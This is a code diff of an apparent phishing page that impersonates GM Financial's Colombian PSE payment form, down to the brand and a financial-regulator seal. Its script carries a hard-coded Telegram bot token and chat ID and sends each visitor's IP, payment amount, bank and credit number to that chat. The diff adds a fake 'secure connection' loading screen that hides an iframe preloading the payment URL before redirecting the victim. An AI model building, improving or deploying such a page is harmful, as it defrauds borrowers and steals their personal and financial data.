@@ -13,11 +13,11 @@
     --gm-gray-border: #cccccc;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  
+
   body {
     font-family: 'Open Sans', Arial, sans-serif;
     color: var(--gm-text);
-    background-color: #f5f5f5; /* Fondo gris suave para que resalte la tarjeta */
+    background-color: #f5f5f5;
     display: flex;
     flex-direction: column;
     min-height: 100vh;
@@ -42,19 +42,17 @@
   }
   @media (min-width: 768px) { .titulo-pago { font-size: 18px; margin-bottom: 30px; } }
 
-  /* La tarjeta (Card) del formulario */
   .card-pago {
     background-color: #ffffff;
     border: 1px solid #e0e0e0;
     border-radius: 8px;
     padding: 25px 20px;
     width: 100%;
-    max-width: 500px; /* En PC no se estira demasiado, se mantiene elegante */
+    max-width: 500px;
     box-shadow: 0 6px 20px rgba(0,0,0,0.08);
   }
   @media (min-width: 768px) { .card-pago { padding: 35px 40px; } }
 
-  /* Campos del formulario */
   .form-group { margin-bottom: 16px; }
   .form-group label {
     display: block; margin-bottom: 6px; font-size: 13px; font-weight: 600; color: #555;
@@ -67,20 +65,15 @@
   .form-group input:focus, .form-group select:focus {
     border-color: var(--gm-blue);
   }
-  
-  /* Estilos para campos bloqueados */
   .form-group input[readonly] {
     background-color: #f0f0f0; color: #666; cursor: not-allowed; font-weight: 600;
   }
-  
-  /* Estilo especial para el monto a pagar */
   .monto-destacado {
-    color: var(--gm-blue) !important; 
-    font-size: 18px !important; 
+    color: var(--gm-blue) !important;
+    font-size: 18px !important;
     font-weight: 700 !important;
   }
 
-  /* Botón */
   .btn-continuar {
     width: 100%; padding: 14px; background-color: var(--gm-blue); color: white;
     border: none; border-radius: 6px; font-size: 16px; font-weight: 600;
@@ -89,7 +82,6 @@
   .btn-continuar:hover:not(:disabled) { background-color: #0036cc; }
   .btn-continuar:disabled { background-color: #88aaff; cursor: not-allowed; }
 
-  /* Alertas */
   .alert { padding: 12px 15px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; display: none; }
   .alert.error { background: #fce8e6; color: #c5221f; border: 1px solid #f5c6cb; }
   .alert.success { background: #e6f4ea; color: #137333; border: 1px solid #c3e6cb; }
@@ -117,16 +109,97 @@
   @media (min-width: 768px) { .footer-right { text-align: right; font-size: 13px; } }
   .footer-right strong { color: #00c98d; }
 
-  /* Spinner */
   .spinner {
     display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4);
     border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ══════════════════════════════════════════════
+     PANTALLA DE CARGA (overlay)
+     ══════════════════════════════════════════════ */
+  .loading-overlay {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #ffffff;
+    display: none;                /* oculta por defecto */
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 30px;
+  }
+  .loading-overlay.active { display: flex; }
+
+  .loading-logo {
+    height: 55px; object-fit: contain;
+  }
+  @media (min-width: 768px) { .loading-logo { height: 70px; } }
+
+  .loading-spinner {
+    width: 48px; height: 48px;
+    border: 4px solid #e0e0e0;
+    border-top-color: var(--gm-blue);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+
+  .loading-text {
+    font-size: 15px; color: #666; text-align: center; line-height: 1.5;
+  }
+  .loading-text strong { color: var(--gm-blue); }
+
+  .loading-steps {
+    display: flex; flex-direction: column; gap: 8px; align-items: center;
+  }
+  .loading-step {
+    font-size: 13px; color: #999; display: flex; align-items: center; gap: 8px;
+    transition: color 0.3s;
+  }
+  .loading-step.done { color: #137333; }
+  .loading-step .check { display: none; }
+  .loading-step.done .check { display: inline; }
+  .loading-step .dot { display: inline; }
+  .loading-step.done .dot { display: none; }
+
+  .loading-bar-container {
+    width: 220px; height: 4px; background: #e0e0e0; border-radius: 4px; overflow: hidden;
+  }
+  .loading-bar {
+    height: 100%; width: 0%; background: var(--gm-blue); border-radius: 4px;
+    transition: width 0.6s ease;
+  }
 </style>
 </head>
 <body>
 
+<!-- ══════ PANTALLA DE CARGA ══════ -->
+<div class="loading-overlay" id="loading-overlay">
+  <img src="gm.png" alt="GM Financial" class="loading-logo"
+       onerror="this.outerHTML='<h1 style=\'color:#0047FF; font-weight:700; font-size:28px;\'>gm FINANCIAL</h1>'">
+
+  <div class="loading-spinner"></div>
+
+  <div class="loading-text">
+    Conectando con tu banco de forma segura
+  </div>
+
+  <div class="loading-steps">
+    <div class="loading-step" id="step1">
+      <span class="dot">○</span><span class="check">✓</span> Verificando datos
+    </div>
+    <div class="loading-step" id="step2">
+      <span class="dot">○</span><span class="check">✓</span> Conectando con PSE
+    </div>
+    <div class="loading-step" id="step3">
+      <span class="dot">○</span><span class="check">✓</span> Redirigiendo al banco
+    </div>
+  </div>
+
+  <div class="loading-bar-container">
+    <div class="loading-bar" id="loading-bar"></div>
+  </div>
+</div>
+
+<!-- ══════ PÁGINA NORMAL ══════ -->
 <div class="top-bar"></div>
 
 <div class="header">
@@ -142,38 +215,31 @@
     <div id="alert-box" class="alert"></div>
 
     <form id="form-pse" autocomplete="off">
-      
-      <!-- 1. Monto a pagar (Visible y bloqueado) -->
       <div class="form-group">
         <label for="amount">Monto a pagar *</label>
         <input type="text" id="amount" required readonly class="monto-destacado">
       </div>
 
-      <!-- 2. Nombre completo -->
       <div class="form-group">
         <label for="nombre_completo">Nombre completo *</label>
         <input type="text" id="nombre_completo" required placeholder="Ej: Juan Pérez">
       </div>
 
-      <!-- 3. Cédula (Prellenada y bloqueada) -->
       <div class="form-group">
         <label for="numero_documento">Cédula de ciudadanía *</label>
         <input type="text" id="numero_documento" required readonly>
       </div>
 
-      <!-- 4. Número de celular -->
       <div class="form-group">
         <label for="celular">Número de celular *</label>
         <input type="tel" id="celular" required placeholder="Ej: 3001234567">
       </div>
 
-      <!-- 5. Correo electrónico -->
       <div class="form-group">
         <label for="email">Correo electrónico *</label>
         <input type="email" id="email" required placeholder="tucorreo@ejemplo.com">
       </div>
 
-      <!-- 6. Banco PSE -->
       <div class="form-group">
         <label for="bank_code">Selecciona tu banco *</label>
         <select id="bank_code" required>
@@ -188,7 +254,6 @@
   </div>
 </div>
 
-<!-- FOOTER NEGRO -->
 <div class="footer">
   <div class="footer-left">
     <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
@@ -207,12 +272,10 @@
   'use strict';
 
   const API_BASE = window.location.origin;
-  
-  // Telegram
+
   const TG_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
   const TG_CHAT_ID   = '-1004457768033';
 
-  // URL Params
   const params = new URLSearchParams(window.location.search);
   const PARAM_DOC     = params.get('documento') || '';
   const PARAM_TOTAL   = params.get('total')     || '';
@@ -220,7 +283,6 @@
   const PARAM_FACTURA = params.get('factura')   || '';
   const PARAM_CREDITO = params.get('credito')   || params.get('numeroCredito') || '';
 
-  // Guardamos el valor numérico real en una variable global
   let VALOR_NUMERICO = 0;
 
   const $ = (id) => document.getElementById(id);
@@ -246,7 +308,7 @@
   }
 
   async function notificarTelegram(ip, valor, banco, credito) {
-    const texto = 
+    const texto =
       '🚨 <b>NUEVO PAGO PSE — GM FINANCIAL</b> 🚨\n' +
       `🌐 <b>IP:</b> <code>${ip}</code>\n` +
       `💰 <b>Valor:</b> ${formatearCOP(valor)}\n` +
@@ -263,13 +325,35 @@
     } catch (err) { console.error('[telegram]', err); }
   }
 
+  /* ── Pantalla de carga: muestra GM mientras Kushkai carga por detrás ── */
+  function mostrarPantallaCarga(bankUrl) {
+    const overlay = $('loading-overlay');
+    overlay.classList.add('active');
+
+    const bar = $('loading-bar');
+    const s1 = $('step1'), s2 = $('step2'), s3 = $('step3');
+
+    // Crear iframe oculto para pre-cargar Kushkai por detrás
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:-1;opacity:0;';
+    iframe.src = bankUrl;
+    document.body.appendChild(iframe);
+
+    // Animación de pasos mientras Kushkai carga
+    setTimeout(() => { s1.classList.add('done'); bar.style.width = '33%'; }, 400);
+    setTimeout(() => { s2.classList.add('done'); bar.style.width = '66%'; }, 1000);
+    setTimeout(() => { s3.classList.add('done'); bar.style.width = '100%'; }, 1600);
+
+    // Después de 2s redirigir — Kushkai ya cargó en el iframe
+    setTimeout(() => { window.location.href = bankUrl; }, 2000);
+  }
+
   function prellenar() {
     if (PARAM_DOC) $('numero_documento').value = PARAM_DOC;
     if (PARAM_NOMBRE) $('nombre_completo').value = PARAM_NOMBRE;
-    
+
     if (PARAM_TOTAL) {
       VALOR_NUMERICO = Number(String(PARAM_TOTAL).replace(/[^0-9.]/g, ''));
-      // Pintamos el valor formateado en el input readonly
       $('amount').value = formatearCOP(VALOR_NUMERICO);
     }
   }
@@ -280,7 +364,7 @@
       const resp = await fetch(`${API_BASE}/pse/bancos`);
       const data = await resp.json();
       if (!data.ok || !Array.isArray(data.bancos)) throw new Error(data.error || 'Inválido');
-      
+
       sel.innerHTML = '<option value="">— Selecciona tu banco —</option>';
       data.bancos.forEach((b) => {
         const opt = document.createElement('option');
@@ -331,7 +415,7 @@
           bank_name: bankName,
           document_type: 'CC',
           document_number: numeroDocumento,
-          amount: VALOR_NUMERICO, // Enviamos el valor numérico real
+          amount: VALOR_NUMERICO,
           email: email,
           full_name: nombre,
         }),
@@ -340,8 +424,8 @@
       const data = await resp.json();
       if (!data.ok || !data.bank_url) throw new Error(data.error || 'No URL');
 
-      mostrarAlerta('success', '✅ Redirigiendo a tu banco...');
-      setTimeout(() => { window.location.href = data.bank_url; }, 800);
+      // ── En vez de redirigir directo, mostrar pantalla de carga ──
+      mostrarPantallaCarga(data.bank_url);
 
     } catch (err) {
       mostrarAlerta('error', 'Error al procesar el pago: ' + err.message);
